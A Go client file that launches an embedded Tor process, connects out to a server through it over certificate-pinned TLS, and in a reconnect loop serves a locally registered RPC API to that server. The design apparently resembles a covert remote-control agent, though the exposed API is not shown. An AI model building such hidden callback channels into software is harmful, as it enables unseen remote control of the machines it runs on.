// +build tor

package client

import (
	"crypto/tls"
	"crypto/x509"
	"io/ioutil"
	"log"
	"net"
	"net/rpc"
	"time"

	"github.com/cretz/bine/process/embedded"
	"github.com/cretz/bine/tor"
)

func connect(dialer *tor.Dialer) (net.Conn, error) {
	log.Println("[NetClient] Connecting to:", s.addr)
	conn, err := dialer.Dial("tcp", s.addr)
	if err != nil {
		return nil, err
	}

	log.Println("[NetClient] [+] Connection to server successful")
	caPool := x509.NewCertPool()
	caPool.AddCert(s.cert)

	config := tls.Config{RootCAs: caPool, ServerName: s.domain}
	tlsconn := tls.Client(conn, &config)

	return tlsconn, nil
}

// NetClient start tor and invoke connect
func NetClient() {
	log.Println("[NetClient] Starting Tor connection...")
	initServer()

	tmpDir, err := ioutil.TempDir("", "")
	if err != nil {
		log.Println("[NetClient] [!] Could not create temp dir for Tor: ", err)
		return
	}

	conf := tor.StartConf{
		ProcessCreator:    embedded.NewCreator(),
		DataDir:           tmpDir,
		RetainTempDataDir: false,
	}

	t, err := tor.Start(nil, &conf)
	if err != nil {
		log.Println("[NetClient] [!] Tor could not be started: ", err)
		return
	}

	api := new(API)
	rpcErr := rpc.Register(api)
	if rpcErr != nil {
		log.Fatal(rpcErr)
    log.Fatal("[NetClient] [!] Could not register RPC API: ", rpcErr)
	}

	defer t.Close()
	dialer, _ := t.Dialer(nil, nil)

	for {
		conn, err := connect(dialer)
		if err != nil {
			log.Println("[NetClient] [!] Could not connect: ", err)
			time.Sleep(25 * time.Second)
			continue
		}
		rpc.ServeConn(conn)
	}
}
